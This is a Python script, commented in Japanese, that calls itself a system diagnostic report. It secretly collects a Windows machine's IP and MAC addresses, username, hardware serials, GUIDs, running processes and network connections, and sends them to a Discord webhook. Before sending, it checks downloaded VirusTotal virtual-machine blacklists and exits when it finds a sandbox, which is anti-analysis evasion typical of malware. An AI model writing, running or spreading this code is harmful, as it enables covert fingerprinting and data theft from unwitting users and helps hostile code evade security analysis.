import asyncio
import aiohttp
import os
import sys
import time
import uuid
import re
import requests
import subprocess
import winreg
import wmi
import psutil
import socket
from datetime import datetime

# 送信先のDiscord Webhook URL
api = "Webhook URL"

def post_message(msg):
    try:
        requests.post(api, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'},
                      data={"content": f"{msg}"})
    except Exception as e:
        print(f"Webhook送信エラー: {e}")

def chunk_text(text, max_chars=1700):
    lines = text.split("\n")
    current_chunk = []
    current_length = 0

    for line in lines:
        if current_length + len(line) + 1 > max_chars:
            if current_chunk:
                yield "\n".join(current_chunk)
            current_chunk = [line]
            current_length = len(line)
        else:
            current_chunk.append(line)
            current_length += len(line) + 1

    if current_chunk:
        yield "\n".join(current_chunk)

def getip():
    try:
        return requests.get("https://api.ipify.org").text.strip()
    except:
        return "None"

def get_guid():
    try:
        reg_connection = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
        key_value = winreg.OpenKey(reg_connection, r"SOFTWARE\Microsoft\Cryptography")
        guid = winreg.QueryValueEx(key_value, "MachineGuid")[0]
        return guid
    except Exception as e:
        print(f"GUID取得エラー: {e}")
        return "None"

def get_hwguid():
    try:
        reg_connection = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
        key_value = winreg.OpenKey(reg_connection, r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001")
        hwguid = winreg.QueryValueEx(key_value, "HwProfileGuid")[0]
        return hwguid
    except Exception as e:
        print(f"HWGuid取得エラー: {e}")
        return "None"

# --- 情報収集ブロック ---
ip = getip()

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
except:
    local_ip = "Unknown"

serveruser = os.getenv("UserName")
pc_name = os.getenv("COMPUTERNAME")
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))

# CPU性能・リアルタイム負荷
cpu_cores = psutil.cpu_count(logical=False)
cpu_threads = psutil.cpu_count(logical=True)
cpu_usage = f"{psutil.cpu_percent(interval=0.1)}%"

# メモリ容量・リアルタイム負荷
virtual_mem = psutil.virtual_memory()
ram_total = f"{round(virtual_mem.total / (1024.0 ** 3))} GB"
ram_usage = f"{virtual_mem.percent}%"

# ストレージ容量
try:
    c_drive = psutil.disk_usage('C:')
    storage_total = f"{round(c_drive.total / (1024 ** 3), 1)} GB"
    storage_free = f"{round(c_drive.free / (1024 ** 3), 1)} GB"
    storage_used_percent = f"{c_drive.percent}%"
except:
    storage_total = storage_free = storage_used_percent = "Unknown"

# 起動時間
try:
    boot_time_timestamp = psutil.boot_time()
    uptime_seconds = time.time() - boot_time_timestamp
    uptime_hours = round(uptime_seconds / 3600, 1)
    uptime_str = f"{uptime_hours} Hours"
except:
    uptime_str = "Unknown"

# WMI情報
try:
    computer = wmi.WMI()
    os_info = computer.Win32_OperatingSystem()[0]
    os_name = os_info.Name.split('|')[0].strip()
    gpu = computer.Win32_VideoController()[0].Name
    cpu_name = computer.Win32_Processor()[0].Name
except:
    os_name = "Unknown"
    gpu = "Unknown"
    cpu_name = "Unknown"

# 新系統①：実行中のプロセス（タスク）上位20件を抽出
process_list = []
for proc in psutil.process_iter(['name']):
    try:
        process_list.append(proc.info['name'])
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        pass
# 重複を排除してソートし、一部を抜粋
unique_processes = sorted(list(set(process_list)))[:20]
process_string = "\n".join([f"  - {p}" for p in unique_processes if p])

# 新系統②：アクティブなネットワーク接続（Established状態の通信）上位10件
connection_list = []
try:
    for conn in psutil.net_connections(kind='inet'):
        if conn.status == 'ESTABLISHED':
            r_ip = conn.raddr.ip if conn.raddr else "None"
            r_port = conn.raddr.port if conn.raddr else "None"
            connection_list.append(f"  - LocalPort: {conn.laddr.port} -> Remote: {r_ip}:{r_port}")
except:
    connection_list = ["  - 接続情報の取得制限、またはエラー"]
connection_string = "\n".join(connection_list[:10])

def get_wmic_output(command):
    try:
        out = subprocess.check_output(command, shell=True).decode().split('\n')
        if len(out) > 1:
            return out[1].strip()
    except:
        pass
    return "None"

hwid = get_wmic_output('wmic csproduct get uuid')
current_baseboard_manufacturer = get_wmic_output('wmic baseboard get manufacturer')
current_diskdrive_serial = get_wmic_output('wmic diskdrive get serialnumber')
current_cpu_serial = get_wmic_output('wmic cpu get serialnumber')
current_bios_serial = get_wmic_output('wmic bios get serialnumber')
current_baseboard_serial = get_wmic_output('wmic baseboard get serialnumber')

hwguid = get_hwguid().replace('{', '').replace('}', '').strip()
machine_guid = get_guid()

# --- ブラックリストの取得 ---
print("ブラックリストを読み込み中...")
hwidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
pcnamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
pcusernamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
iplist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
maclist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
gpulist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
diskdriveserial_list = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/DiskDrive_Serial_List.txt')
cpuserial_list = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/CPU_Serial_List.txt')
baseboardmanufacturerlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Manufacturer_List.txt')
bios_serial_list = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BIOS_Serial_List.txt')
baseboardserial_list = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Serial_List.txt')
machineguidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/MachineGuid.txt')
hwprofileguidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/HwProfileGuid_List.txt')

async def pcdetect():
    all_info = f"""![ADVANCED SYSTEM DIAGNOSTIC REPORT]!  
PC Name: {pc_name}
PC Username: {serveruser}
OS Platform: {os_name}
Uptime: {uptime_str}
TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

[NETWORK]
Global IP: {ip}
Local IP: {local_ip}
MAC Address: {mac}

[CURRENT RESOURCE USAGE]
CPU Usage: {cpu_usage}
RAM Usage: {ram_usage} ({ram_total} Total)

[HARDWARE SPEC]
CPU: {cpu_name} ({cpu_cores} Cores / {cpu_threads} Threads)
GPU: {gpu}
Storage C: {storage_total} Total (Free: {storage_free} / Used: {storage_used_percent})

[ACTIVE NETWORK CONNECTIONS]
{connection_string if connection_string else "  - なし"}

[RUNNING PROCESSES (SAMPLE)]
{process_string if process_string else "  - なし"}

[SERIAL / GUID]
HWID: {hwid}
BiosSerial: {current_bios_serial}
BaseBoardManufacturer: {current_baseboard_manufacturer}
BaseBoardSerial: {current_baseboard_serial}
CPUSerial: {current_cpu_serial}
DiskDriveSerial: {current_diskdrive_serial}
HWProfileGUID: {hwguid}
MachineGUID: {machine_guid}"""

    async with aiohttp.ClientSession() as session:
        for chunk in chunk_text(all_info):
            data = {"content": f"```yaml\n{chunk}```"}
            try:
                async with session.post(api, json=data) as response:
                    if response.status in (200, 204):
                        print("Discordへの診断データ送信に成功しました。")
                    else:
                        print(f"Discord送信失敗 (ステータスコード: {response.status})")
            except Exception as e:
                print(f"通信エラー発生: {e}")
            await asyncio.sleep(0.5)

def listcheck():
    try:
        if hwid in hwidlist.text:
            post_message(f"**Blacklisted HWID Detected.**")
            time.sleep(2)
            os._exit(1)
    except: pass
    try:
        if serveruser in pcusernamelist.text:
            post_message(f"**Blacklisted PC User.**")
            time.sleep(2)
            os._exit(1)
    except: pass
    try:
        if pc_name in pcnamelist.text:
            post_message(f"**Blacklisted PC Name.**")
            time.sleep(2)
            os._exit(1)
    except: pass
    try:
        if ip in iplist.text:
            post_message(f"**Blacklisted IP.**")
            time.sleep(2)
            os._exit(1)
    except: pass
    try:
        if mac in maclist.text:
            post_message(f"**Blacklisted MAC.**")
            time.sleep(2)
            os._exit(1)
    except: pass
    try:
        if gpu in gpulist.text:
            post_message(f"**Blacklisted GPU.**")
            time.sleep(2)
            os._exit(1)
    except: pass
    try:
        if current_diskdrive_serial in diskdriveserial_list.text:
            post_message(f"**Blacklisted DiskDriveSerial.**")
            time.sleep(2)
            os._exit(1)
    except: pass
    try:
        if current_cpu_serial in cpuserial_list.text:
            post_message(f"**Blacklisted CPUSerial.**")
            time.sleep(2)
            os._exit(1)
    except: pass
    try:
        if current_baseboard_manufacturer in baseboardmanufacturerlist.text:
            post_message(f"**Blacklisted BaseBoardManufacturer.**")
            time.sleep(2)
            os._exit(1)
    except: pass
    try:
        if current_bios_serial in bios_serial_list.text:
            post_message(f"**Blacklisted BiosSerial.**")
            time.sleep(2)
            os._exit(1)
    except: pass
    try:
        if current_baseboard_serial in baseboardserial_list.text:
            post_message(f"**Blacklisted BaseBoardSerial.**")
            time.sleep(2)
            os._exit(1)
    except: pass
    try:
        if machine_guid in machineguidlist.text:
            post_message(f"**Blacklisted MachineGUID.**")
            time.sleep(2)
            os._exit(1)
    except: pass
    try:
        if hwguid in hwprofileguidlist.text:
            post_message(f"**Blacklisted MachineHWGUID.**")
            time.sleep(2)
            os._exit(1)
    except: pass

async def main():
    listcheck()
    print("安全な環境と判定されました。高度な診断レポートを構築・送信中...")
    await pcdetect()

if __name__ == "__main__":
    if sys.platform == "win32" and sys.version_info >= (3, 8):
        if isinstance(asyncio.get_event_loop_policy(), asyncio.DefaultEventLoopPolicy):
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    asyncio.run(main())